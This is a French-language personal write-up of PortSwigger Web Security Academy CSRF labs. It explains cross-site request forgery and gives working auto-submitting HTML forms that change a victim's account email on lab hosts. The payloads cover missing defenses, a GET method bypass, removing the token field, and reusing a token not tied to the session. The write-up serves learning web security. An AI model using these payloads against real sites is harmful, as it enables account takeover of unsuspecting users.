Un attaque CSRF consiste à faire effectuer à l'utilisateur une action sur un site A en mettant du code sur un autre site B.

Par exemple a.com a une fonctionnalité de modification d'email.
Si un site b.com (très méchant), crée une page web qui fait une action automatique vers le site a.com (non protégé), il pourra envoyer sa page à des utilisateurs qui déclencherons des actions sur le site a.com ou il sont auth et dans la mesure ou leurs cookie sont envoyé avec la requêtes :

```html
<html>
	<body>
		<form action="https://vulnerable-website.com/email/change"   method="POST"> 
		<input type="hidden" name="email" value="pwned@evil-user.net" />
		</form> 
		<script> document.forms[0].submit(); </script> 
	</body>
</html>
```

### Lab: CSRF vulnerability with no defenses
L'attaque fonctione, aucune défense n'a était mise en place. Quelque qui est authentifié sur le site et et qui visite une page contenant se code verra son compte être lié à l'email `toto@gmail.com`.
```html
<html>
	<body>
	<form class="login-form" name="change-email-form" action="https://0aaf002f0376312481fa39bb00610017.web-security-academy.net/my-account/change-email" method="POST">
	<input required type="email" name="email" value="toto@gmail.com">
	</form>
	<script> document.forms[0].submit(); </script> 
	</body>
<html>
```

### Lab: CSRF where token validation depends on request method
Ici on remarque que la csrf token n'est tester que sur les requêtes post (on test de mettre un token csrf non valide sur cette méthode). Il se trouve que le formulaire de réinitialisation fonctionne aussi avec un argument en GET :
```html
<html>
	<body>
	<script>
	window.location.href = "https://0a1c00a404ab4742a5aa77b400e800db.web-security-academy.net/my-account/change-email?email=wiener@normal-user.net";
	</script>
	</body>
<html>
```

### Lab: CSRF where token validation depends on token being present
Bon alors là c'est marrant. Le site vérifie le csrf token (youpie !!!) que si il est présent dans la requête (Ooops...).
```
<html>
<body>
<form class="login-form" name="change-email-form" action="https://0a7800970382c27f80f23ff100c500ad.web-security-academy.net/my-account/change-email" method="POST">
<input required type="email" name="email" value="wiener@normal-user.net">
</form>
<script> document.forms[0].submit(); </script> 
</body>
</html>
```
On supprime juste l'input "csrf_token".

### Lab: CSRF where token is not tied to user session
Dans certain cas les tokens csrf sont bien vérifié mais ne sont pas lié à une sessions. Par conséquence un attaquant peu récupérer un token valide et il le sera pour tout les autres utilisateurs (Dommage).
```
<html>
<body>
<form class="login-form" name="change-email-form" action="https://0af600e303eb0fa480393a89009f0087.web-security-academy.net/my-account/change-email" method="POST">

<input required type="email" name="email" value="toto@gmail.com">
<input required type="hidden" name="csrf" value="MU8Qh93PhnH54M81mvUAzlg2829W8A9L">

</form>
<script> document.forms[0].submit(); </script> 
</body>
</html>
```
Les tokens sont ici à usage unique on peu en récupérer un nouveau à chaque fois en rafraîchissant la page.


J'ai fait une erreur sur celui là. Au début je pensais pouvoir overwrite le cookie de la victime pour le mettre le miens directement en JS.
J'avais mis ça dans mon script mais c'est useless puisque le cookie en question a l'attribut http only :
```
document.cookie = "csrfKey=ratata"
```


